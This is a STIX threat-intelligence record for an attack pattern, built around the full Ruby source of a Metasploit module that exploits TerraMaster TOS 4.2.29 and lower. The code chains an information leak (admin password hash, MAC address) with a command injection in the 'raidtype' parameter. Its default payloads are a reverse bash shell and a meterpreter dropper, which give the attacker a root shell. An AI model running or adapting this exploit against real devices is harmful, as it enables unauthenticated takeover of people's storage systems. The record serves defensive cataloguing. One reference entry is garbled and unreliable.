{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e3f526cf-9bc9-4253-96a1-9a9a474569cf",
    "created": "2024-08-14T17:04:25.963495Z",
    "modified": "2024-08-14T17:04:25.963499Z",
    "name": "TerraMaster TOS 4.2.29 or lower - Unauthenticated RCE chaining CVE-2022-24990 and CVE-2022-24989",
    "description": " This module exploits an unauthenticated remote code execution vulnerability in TerraMaster TOS 4.2.29",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/terramaster_unauth_rce_cve_2022_24990.rb",
            "external_id": "terramaster_unauth_rce_cve_2022_24990.rb"
        },
        {
            "source_name": "andCVE-2022-24989",
            "external_id": "\"Authenticatedremotecodeexecution\"."
        },
        {
            "source_name": "CVE",
            "external_id": "2022-24990"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-24989"
        },
        {
            "source_name": "reference",
            "url": "https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/0xf4n9x/CVE-2022-24990"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/h8YKVKx21t/cve-2022-24990"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'digest/md5'\nrequire 'time'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'TerraMaster TOS 4.2.29 or lower - Unauthenticated RCE chaining CVE-2022-24990 and CVE-2022-24989',\n        'Description' => %q{\n          This module exploits an unauthenticated remote code execution vulnerability in TerraMaster TOS 4.2.29\n          and lower by chaining two existing vulnerabilities, CVE-2022-24990 \"Leaking sensitive information\"\n          and CVE-2022-24989, \"Authenticated remote code execution\".\n          Exploiting vulnerable endpoint `api.php?mobile/webNasIPS` leaking sensitive information such as admin password\n          hash and mac address, the attacker can achieve unauthenticated access and use another vulnerable endpoint\n          `api.php?mobile/createRaid` with POST parameters `raidtype` and `diskstring` to execute remote code as root\n          on TerraMaster NAS devices.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor\n          'Octagon Networks', # Discovery\n          '0xf4n9x' # POC\n        ],\n        'References' => [\n          ['CVE', '2022-24990'],\n          ['CVE', '2022-24989'],\n          ['URL', 'https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/'],\n          ['URL', 'https://github.com/0xf4n9x/CVE-2022-24990'],\n          ['URL', 'https://attackerkb.com/topics/h8YKVKx21t/cve-2022-24990']\n        ],\n        'DisclosureDate' => '2022-03-07',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86, ARCH_AARCH64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => ['bourne', 'wget', 'curl'],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8181,\n          'SSL' => false\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path to Terramaster Web console', '/'])\n    ])\n  end\n\n  def get_data\n    # Initialise variable data to store the leaked data\n    @data = {}\n\n    # Get the data by exploiting the LFI vulnerability through vulnerable endpoint `api.php?mobile/webNasIPS`\n    # CVE-2022-24990\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'module', 'api.php?mobile/webNasIPS'),\n      'headers' => {\n        'User-Agent' => 'TNAS'\n      }\n    })\n    if res && res.code == 200 && res.body.include?('webNasIPS successful')\n      # Parse the JSON response and get the data such as admin password hash and MAC address\n      res_json = res.get_json_document\n      unless res_json.blank?\n        @data['password'] = res_json['data'].split('PWD:')[1].split('SAT')[0].strip\n        @data['mac'] = res_json['data'].split('mac\":\"')[1].split('\"')[0].tr(':', '').strip\n        @data['key'] = @data['mac'][6..11] # last three MAC address entries\n        @data['timestamp'] = Time.new.to_i.to_s\n        # derive signature\n        @data['signature'] = tos_encrypt_str(@data['key'], @data['timestamp'])\n      end\n    end\n  end\n\n  def tos_encrypt_str(key, str_to_encrypt)\n    id = key + str_to_encrypt\n    return Digest::MD5.hexdigest(id.encode('utf-8'))\n  end\n\n  def execute_command(cmd, _opts = {})\n    # Execute RCE using vulnerable endpoint `api.php?mobile/createRaid`\n    # CVE-2022-24989\n    diskstring = Rex::Text.rand_text_alpha_upper(4..8)\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'module', 'api.php?mobile/createRaid'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'headers' => {\n        'User-Agent' => 'TNAS',\n        'Authorization' => @data['password'],\n        'Signature' => @data['signature'],\n        'Timestamp' => @data['timestamp']\n      },\n      'vars_post' => {\n        'raidtype' => ';' + cmd,\n        'diskstring' => diskstring.to_s\n      }\n    })\n  end\n\n  def get_terramaster_info\n    # get Terramaster CPU architecture (X64 or ARM64) and TOS version\n    @terramaster = {}\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'tos', 'index.php?user/login')\n    })\n\n    if res && res.body && res.code == 200\n      # get the version information from the request response like below:\n      # <link href=\"./static/style/bootstrap.css?ver=TOS3_A1.0_4.2.07\" rel=\"stylesheet\"/>\n      return if res.body.match(/ver=.+?\"/).nil?\n\n      version = res.body.match(/ver=.+?\"/)[0]\n      # check if architecture is ARM64 or X64\n      if version.match(/_A/)\n        @terramaster['cpu_arch'] = 'ARM64'\n      elsif version.match(/_S/) || version.match(/_Q/)\n        @terramaster['cpu_arch'] = 'X64'\n      else\n        @terramaster['cpu_arch'] = 'UNKNOWN'\n      end\n\n      # strip TOS version number and remove trailing double quote.\n      @terramaster['tos_version'] = version.split('.0_')[1].chop\n    end\n  end\n\n  def check\n    get_terramaster_info\n    return CheckCode::Safe if @terramaster.empty?\n\n    if Rex::Version.new(@terramaster['tos_version']) <= Rex::Version.new('4.2.29')\n      return CheckCode::Vulnerable(\"TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.\")\n    end\n\n    CheckCode::Safe(\"TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.\")\n  end\n\n  def exploit\n    get_data\n    fail_with(Failure::BadConfig, 'Can not retrieve the leaked data.') if @data.empty?\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      # Don't check the response here since the server won't respond\n      # if the payload is successfully executed.\n      execute_cmdstager(linemax: 65536)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-03-07",
    "x_mitre_platforms": [
        "linux'"
    ]
}